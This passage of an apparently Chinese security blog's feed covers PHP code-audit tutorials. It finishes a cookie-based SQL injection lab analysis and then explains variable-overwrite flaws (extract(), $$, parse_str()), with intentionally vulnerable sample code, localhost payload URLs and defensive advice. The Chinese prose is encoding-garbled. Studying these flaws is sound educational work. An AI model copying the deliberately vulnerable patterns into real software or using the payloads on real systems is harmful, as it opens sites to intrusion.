class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&lt;/b&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your ID:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&lt;br&gt;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//echo &#x27;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&#x27;;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;input  type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Delete Your Cookie!&quot; /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/form&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 6 &gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot; Your Cookie is deleted&quot;</span>;</span><br><span class="line">setcookie(<span class="string">&#x27;uname&#x27;</span>, <span class="variable">$row1</span>[<span class="string">&#x27;username&#x27;</span>], time()-<span class="number">3600</span>);</span><br><span class="line">header (<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/font&gt;&lt;/center&gt;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//header (&#x27;Location: main.php&#x27;);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//echo &#x27;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&lt;/center&gt;&#x27;;</span></span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="variable">$fp</span>=fopen(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">fwrite(<span class="variable">$fp</span>,<span class="string">&#x27;Cookie:&#x27;</span>.<span class="variable">$cookee</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">fclose(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p> ä»£ç åˆ†æ</p><p>å½“æˆ‘ä»¬è¾“å…¥äº†è´¦æˆ·å’Œå¯†ç ç™»å½•çš„æ—¶å€™ï¼Œä¼šå°† <code>uname</code>å­—æ®µå­˜å…¥ cookeeä¸­ï¼Œå½“æˆ‘ä»¬å†æ¬¡è®¿é—®é¡µé¢æ—¶ï¼Œä¼šåˆ¤æ–­cookeeæ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨åˆ™æ‰§è¡Œ<code>$sql=&quot;SELECT * FROM users WHERE username=&#39;$cookee&#39; LIMIT 0,1&quot;;</code> é€šè¿‡è¿™ä¸ªå‘é€SQLè¯­å¥æŸ¥è¯¢ç”¨æˆ·ä¿¡æ¯ï¼Œä½†æ˜¯æ­¤ä»£ç ç‰‡æ®µæœªåšä»»ä½•è¿‡æ»¤ï¼Œæ‰€ä»¥æ³¨å…¥ç‚¹å°±åœ¨ <code>$cookee</code></p><p><img src="/2021/3145843663/image-20211213190230850.png" alt="image-20211213190230850"> </p><p>æ€»ç»“</p><p>SQLæ³¨å…¥ä¸»è¦æ˜¯ç”¨ä¸åŒæ–¹å¼æ¥æ”¶äº†ç”¨æˆ·çš„è¾“å…¥ï¼Œå¼€å‘è€…å¹¶æ²¡æœ‰å¯¹é½è¿›è¡Œè¿‡æ»¤ï¼Œç›´æ¥å¸¦å…¥SQLè¯­å¥ã€‚</p><p>å‚è€ƒé“¾æ¥</p><p><a href="https://www.runoob.com/sql/sql-syntax.html">https://www.runoob.com/sql/sql-syntax.html</a></p><p><a href="https://www.freebuf.com/vuls/265629.html">https://www.freebuf.com/vuls/265629.html</a></p>]]></content>
    
    
    <summary type="html">SQLæ³¨å…¥çš„æ¡ä»¶ã€ç±»å‹ã€æ¼æ´åœºæ™¯ã€å®¡è®¡æ€è·¯ã€æ¼æ´ä¿®å¤ã€GETæ³¨å…¥ã€POSTæ³¨å…¥ã€COOKIEæ³¨å…¥æ¡ˆä¾‹åˆ†æ</summary>
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://fz1lin.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="PHP" scheme="https://fz1lin.com/tags/PHP/"/>
    
    <category term="SQLæ³¨å…¥" scheme="https://fz1lin.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>phpä»£ç å®¡è®¡-å˜é‡è¦†ç›–</title>
    <link href="https://fz1lin.com/2021/3414130932/"/>
    <id>https://fz1lin.com/2021/3414130932/</id>
    <published>2021-12-08T10:46:22.000Z</published>
    <updated>2021-12-08T10:51:02.222Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-æ¼æ´å‘ç°"><a href="#0x00-æ¼æ´å‘ç°" class="headerlink" title="0x00 æ¼æ´å‘ç°"></a>0x00 æ¼æ´å‘ç°</h2><p>å˜é‡è¦†ç›–æ˜¯æŒ‡æˆ‘ä»¬è‡ªå®šä¹‰çš„å‚æ•°å€¼æ›¿æ¢ç¨‹åºåŸæœ‰çš„å˜é‡å€¼ï¼Œä¸€èˆ¬éœ€è¦æ ¹æ®ç¨‹åºçš„åŠŸèƒ½æ¥æ„é€  payload</p><p>ä»¥ä¸‹å‡½æ•°æˆ–è¯­æ³•ä½¿ç”¨ä¸å½“æ—¶ï¼Œå°±ä¼šå‡ºç°æ¼æ´</p><ul><li>register_globals       (è‡ª PHP 5.3.0 èµ·åºŸå¼ƒå¹¶å°†è‡ª PHP 5.4.0 èµ·ç§»é™¤ã€‚)</li><li>extract()</li><li><code>$$</code></li><li>parse_str()</li><li>mb_parse_str()</li><li>import_request_variables()     (PHP 4 &gt;= 4.1.0, PHP 5 &lt; 5.4.0)</li></ul><h2 id="0x01-register-globals-å…¨å±€å˜é‡è¦†ç›–"><a href="#0x01-register-globals-å…¨å±€å˜é‡è¦†ç›–" class="headerlink" title="0x01 register_globals å…¨å±€å˜é‡è¦†ç›–"></a>0x01 register_globals å…¨å±€å˜é‡è¦†ç›–</h2><p>php.ini ä¸­æœ‰ä¸€é¡¹ä¸º register_globalsï¼Œå³æ³¨å†Œå…¨å±€å˜é‡ï¼Œå½“register_globals=Onæ—¶ï¼Œä¼ é€’è¿‡æ¥çš„å€¼ä¼šè¢«ç›´æ¥çš„æ³¨å†Œä¸ºå…¨å±€å˜é‡ç›´æ¥ä½¿ç”¨ï¼Œè€Œå½“ register_globals=Offæ—¶ï¼Œæˆ‘ä»¬éœ€è¦åˆ°ç‰¹å®šçš„æ•°ç»„é‡Œå»å¾—åˆ°å®ƒã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Register_globals: &quot;</span> . (<span class="keyword">int</span>)ini_get(<span class="string">&quot;register_globals&quot;</span>) . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span>) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Hacked!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸º On</p><p><img src="/2021/3414130932/image-20211207150529777.png" alt="image-20211207150529777"> </p><blockquote><p>ä¿®æ”¹é…ç½®æ–‡ä»¶è¦é‡å¯ Apache</p></blockquote><p>ä¸ºOff</p><p><img src="/2021/3414130932/image-20211207150814956.png" alt="image-20211207150814956">  </p><h2 id="0x02-extract-å˜é‡è¦†ç›–"><a href="#0x02-extract-å˜é‡è¦†ç›–" class="headerlink" title="0x02 extract å˜é‡è¦†ç›–"></a>0x02 extract å˜é‡è¦†ç›–</h2><p>è€ƒå¯ŸçŸ¥è¯†ç‚¹ï¼šæ¥å—ç”¨æˆ·çš„<code>$_GETã€$_POST</code>è¿™ç±»ç”¨æˆ·å¯æ§çš„å˜é‡ï¼Œå¯èƒ½å­˜åœ¨å˜é‡è¦†ç›–é—®é¢˜ï¼Œå¦‚æœä¸æŒ‡å®šextractå‡½æ•°çš„flagsä½æˆ–è€…æ˜¯<code>EXTR_OVERWRITE</code>ï¼Œä¹Ÿæœ‰å¯èƒ½ä¼šå­˜åœ¨å˜é‡è¦†ç›–é—®é¢˜</p><h3 id="ä»£ç å¤ç°"><a href="#ä»£ç å¤ç°" class="headerlink" title="ä»£ç å¤ç°"></a>ä»£ç å¤ç°</h3><p><img src="/2021/3414130932/image-20211207103754274.png" alt="image-20211207103754274"> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&#x27;xxx&#x27;</span>; </span><br><span class="line">extract(<span class="variable">$_GET</span>);</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$shiyan</span>))</span><br><span class="line"> &#123; </span><br><span class="line">    <span class="variable">$content</span>=trim(file_get_contents(<span class="variable">$flag</span>));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$shiyan</span>==<span class="variable">$content</span>)</span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span><span class="string">&#x27;extractå˜é‡è¦†ç›–æˆåŠŸ&#x27;</span>; </span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123; </span><br><span class="line">    <span class="keyword">echo</span><span class="string">&#x27;Oh.no&#x27;</span>;</span><br><span class="line">   &#125; </span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="åˆ†ææ¼æ´ä»£ç "><a href="#åˆ†ææ¼æ´ä»£ç " class="headerlink" title="åˆ†ææ¼æ´ä»£ç "></a>åˆ†ææ¼æ´ä»£ç </h3><p>æˆ‘çœ‹ä»£ç å‘ç°ä¸€ä¸ª<a href="https://www.php.net/manual/zh/function.extract">extract</a>å‡½æ•°ï¼ŒæŸ¥ä¸€ä¸‹æ‰‹å†Œï¼Œæˆ‘ä»¬å‘ç° extract æ˜¯å°†æ•°ç»„ä¸­çš„å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ï¼Œé»˜è®¤å¦‚æœä¸æŒ‡å®šï¼Œflagsä½ï¼Œå°±ä¼šè¦†ç›–å·²æœ‰çš„å˜é‡ã€‚</p><p><img src="/2021/3414130932/image-20211207104650885.png" alt="image-20211207104650885"> </p><p><img src="/2021/3414130932/image-20211207105654750.png" alt="image-20211207105654750"> </p><p>extract()å‡½æ•°éœ€è¦é€šè¿‡GETè¯·æ±‚ä¼ å‚</p><p>å‡½æ•°è§£æ</p><ul><li>isset() å‡½æ•°åˆ¤æ–­æ˜¯å¦å­˜åœ¨å˜é‡<code>$shiyan</code></li><li>trim() å»é™¤å­—ç¬¦ä¸²é¦–å°¾å¤„çš„ç©ºç™½å­—ç¬¦</li><li>file_get_contents() å°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸² ï¼Œå¦‚æœ<code>$shiyan</code>çš„å€¼ç­‰äºæ–‡ä»¶çš„å†…å®¹ (<code>$content</code>)æ—¶ï¼Œå°±ä¼šæ‰“å°è¦†ç›–æˆåŠŸ</li></ul><p>extract()ä¼šå°†<code>$flag</code>å’Œ<code>$shiyan</code>çš„å€¼è¦†ç›–äº†ï¼Œå°†å˜é‡çš„å€¼è®¾ç½®ä¸ºç©ºæˆ–è€…ä¸å­˜åœ¨çš„æ–‡ä»¶å°±æ»¡è¶³<code>$shiyan== $content</code></p><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost/code/extract.php?shiyan=&amp;flag=</span></span><br><span class="line">http:<span class="comment">//localhost/code/extract.php?shiyan=&amp;</span></span><br></pre></td></tr></table></figure><h2 id="0x03-å¯å˜å˜é‡"><a href="#0x03-å¯å˜å˜é‡" class="headerlink" title="0x03 $$ å¯å˜å˜é‡"></a>0x03 <code>$$</code> å¯å˜å˜é‡</h2><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p><code>$$</code>äº§ç”Ÿçš„æ¼æ´åŸå› æ˜¯<code>foreach</code>éå†æ•°ç»„çš„å€¼ï¼Œç„¶åå°†è·å–çš„æ•°ç»„é”®åä½œä¸ºå˜é‡ï¼Œæ•°ç»„ä¸­çš„å€¼ä½œä¸ºå˜é‡çš„å€¼æˆ–è€…é”®å€¼</p><p>foreach å¾ªç¯ï¼Œåªç”¨äºæ•°ç»„ï¼Œéå†æ•°ç»„ä¸­çš„å€¼ã€‚å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$arr</span> <span class="keyword">as</span> &amp;<span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$value</span> \n&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//1 2 3 4</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>$$</code> æ˜¯<a href="https://www.php.net/manual/zh/language.variables.variable.php">å¯å˜å˜é‡</a> </p><p>ä¸€ä¸ªå¯å˜å˜é‡è·å–äº†ä¸€ä¸ªæ™®é€šå˜é‡çš„å€¼ä½œä¸ºè¿™ä¸ªå¯å˜å˜é‡çš„å˜é‡åã€‚</p><p> æ„æ€å°±æ˜¯ï¼šåœ¨æœ¬æ¡ˆä¾‹ä¸­<code>$$a</code>å¯ä»¥çœ‹åšæ˜¯ <code>$$a = $&#123;$a&#125; = $hello </code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="variable">$$a</span> = <span class="string">&#x27;world&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span> $<span class="subst">&#123;$a&#125;</span>&quot;</span>;   <span class="comment"># hello world</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span> <span class="subst">$hello</span>&quot;</span>;  <span class="comment"># hello world</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="æ¼æ´äº§ç”Ÿ"><a href="#æ¼æ´äº§ç”Ÿ" class="headerlink" title="æ¼æ´äº§ç”Ÿ"></a>æ¼æ´äº§ç”Ÿ</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">&#x27;_COOKIE&#x27;</span>,<span class="string">&#x27;_POST&#x27;</span>,<span class="string">&#x27;_GET&#x27;</span>) <span class="keyword">as</span> <span class="variable">$_request</span>)  </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$$_request</span> <span class="keyword">as</span> <span class="variable">$_key</span>=&gt;<span class="variable">$_value</span>)  </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$$_key</span>=  <span class="variable">$_value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$id</span> = <span class="keyword">isset</span>(<span class="variable">$id</span>) ? <span class="variable">$id</span> : <span class="string">&quot;test&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$id</span> === <span class="string">&quot;fz1lin&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;flag&#123;xxxxxxxxxx&#125;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Nothing...&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="ä»£ç å¤ç°-1"><a href="#ä»£ç å¤ç°-1" class="headerlink" title="ä»£ç å¤ç°"></a>ä»£ç å¤ç°</h3><p><img src="/2021/3414130932/image-20211207162259431.png" alt="image-20211207162259431"> </p><p>åˆ†æ è¿™é‡Œä½¿ç”¨ GETï¼ŒPOSTã€COOKIEæ–¹å¼éƒ½å¯ä»¥è§¦å‘ï¼Œå½“ä¼ å…¥id=fz1linæ˜¯ï¼Œåœ¨foreach è¯­å¥ä¸­ï¼Œ<code>$_key</code>ä¸ºid <code>$_value</code>ä¸ºfz1linï¼Œä½¿å¾— $id=fz1linï¼Œä»è€Œå®ç°äº†å˜é‡è¦†ç›–ã€‚</p><h2 id="0x04-parse-str"><a href="#0x04-parse-str" class="headerlink" title="0x04 parse_str()"></a>0x04 parse_str()</h2><p><a href="https://www.php.net/manual/zh/function.parse-str">parse_str</a> </p><p><img src="/2021/3414130932/image-20211207163607685.png" alt="image-20211207163607685"> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æŠŠæŸ¥è¯¢å­—ç¬¦ä¸²è§£æåˆ°å˜é‡ä¸­ï¼š</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">parse_str(<span class="string">&quot;name=Peter&amp;age=24&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$age</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/3414130932/image-20211207163931411.png" alt="image-20211207163931411"> </p><p>å¦‚æœæˆ‘ä»¬æŠŠparse_str()æ‹¬å·é‡Œé¢çš„æ¢åšï¼Œ<code>$_POST</code> ã€<code>$_GET</code>ä¹‹ç±»çš„ï¼Œæ˜¯ä¸æ˜¯å°±èƒ½æ‰§è¡Œå‡½æ•°äº†</p><h2 id="0x05-mb-parse-str"><a href="#0x05-mb-parse-str" class="headerlink" title="0x05 mb_parse_str()"></a>0x05 mb_parse_str()</h2><p><a href="https://www.php.net/manual/zh/function.mb-parse-str">mb_parse_str()</a>å‡½æ•°å’Œ parse_str()ç±»ä¼¼ï¼Œç”¨äºè§£æGET/POST/COOKIEã€è®¾ç½®ä¸ºå…¨å±€å˜é‡</p><h2 id="0x06-import-request-variables"><a href="#0x06-import-request-variables" class="headerlink" title="0x06 import_request_variables()"></a>0x06 import_request_variables()</h2><p>æ–°ç‰ˆæœ¬å·²ç»å¼ƒç”¨äº†ã€å®˜æ–¹æ–‡æ¡£å·²ç»æœä¸åˆ°ï¼Œå¯ä»¥çœ‹è¿™ä¸ª<a href="https://www.runoob.com/php/php-import_request_variables-function.html">import_request_variables</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// æ­¤å¤„å°†å¯¼å…¥ GET å’Œ POST å˜é‡</span></span><br><span class="line"><span class="comment">// ä½¿ç”¨ test_ ä½œä¸ºå‰ç¼€</span></span><br><span class="line">import_request_variables(<span class="string">&quot;gP&quot;</span>, <span class="string">&quot;test_&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x07-é˜²å¾¡æ‰‹æ®µ"><a href="#0x07-é˜²å¾¡æ‰‹æ®µ" class="headerlink" title="0x07 é˜²å¾¡æ‰‹æ®µ"></a>0x07 é˜²å¾¡æ‰‹æ®µ</h2><ul><li>ç¦æ­¢å˜é‡æ³¨å†Œï¼Œé¿å…æ³¨å†Œæ—¶æœªéªŒè¯è¯¥å˜é‡æ˜¯å¦å­˜åœ¨è€Œé€ æˆæ¶æ„è¦†ç›–å˜é‡çš„é—®é¢˜ã€‚</li><li>ç¦æ­¢å¼€å¯å…¨å±€å˜é‡æ³¨å†Œæˆ–ä½¿ç”¨PHPé«˜ç‰ˆæœ¬</li><li>å¯¹äº extract()ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¹Ÿå°±æ˜¯flagsä½ï¼Œé™å®šä½¿ç”¨ EXTR_SKIPï¼›</li><li>å¯¹äºparse_str()å‡½æ•°ï¼Œåœ¨æ³¨å†Œå˜é‡å‰ï¼Œå…ˆéªŒè¯æ˜¯å¦å­˜åœ¨ï¼Œå¯ä»¥è®¾ç½®ä¸€ä¸ªç™½åå•</li><li>å¯¹äº<code>$$</code>æœ€å¥½ä½¿ç”¨<code>$_GET</code>ã€<code>$_POST</code>ã€<code>$_COOKIE</code>çš„å½¢å¼ã€‚ </li></ul><h2 id="0x08-æ€»ç»“"><a href="#0x08-æ€»ç»“" class="headerlink" title="0x08 æ€»ç»“"></a>0x08 æ€»ç»“</h2><p>å˜é‡è¦†ç›–ï¼Œæ¼æ´å‡ºå¤„ï¼Œå°±æ˜¯åœ¨äºå¼€å‘è€…å¯¹å˜é‡çš„æŠŠæ§ï¼Œä»¥åŠå¯¹å‡½æ•°çš„ç†è§£ç¨‹åº¦ï¼Œæ‰€ä»¥ï¼Œåœ¨å¼€å‘çš„æ—¶å€™ï¼Œä¸€å®šè¦çœ‹æ‰‹å†Œï¼Œä¸€å®šè¦çœ‹æ‰‹å†Œï¼Œä¸€å®šè¦çœ‹æ‰‹å†Œã€‚</p><p>å¸¸è§å˜é‡è¦†ç›–æ¼æ´ï¼Œextract()ã€<code>$$</code>ã€parse_str() </p><p>æ„é€ payloadéœ€è¦ç»“åˆæ¼æ´ç¨‹åºçš„æˆå› ï¼Œå…·ä½“åˆ†æï¼Œç„¶åæ„é€ ï¼Œå¦‚æœæ˜¯å®¡è®¡ cms éœ€è¦æ„é€ URLï¼Œå»ç†è§£ MVCæ€æƒ³ã€‚</p><p>å‚è€ƒ</p><p><a href="https://crayon-xin.github.io/2018/05/21/extract%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/">extractå˜é‡è¦†ç›–</a></p><p><a href="https://www.mi1k7ea.com/2019/06/20/PHP%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/">PHPå˜é‡è¦†ç›–æ¼æ´å°ç»“</a></p>]]></content>
    
    
    <summary type="html">register_globalsã€extract()ã€$$ã€parse_str()ã€mb_parse_str()ã€import_request_variables()</summary>
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://fz1lin.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="PHP" scheme="https://fz1lin.com/tags/PHP/"/>
    
    <category term="å˜é‡è¦†ç›–" scheme="https://fz1lin.com/tags/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"/>
    
  </entry>
  
  <entry>
    <title>å…³äºä»£ç å®¡è®¡ç¯å¢ƒçš„å“ªäº›äº‹</title>
    <link href="https://fz1lin.com/2021/127456454/"/>
    <id>https://fz1lin.com/2021/127456454/</id>
    <published>2021-12-05T09:12:15.000Z</published>
    <updated>2021-12-06T07:20:15.456Z</updated>
    
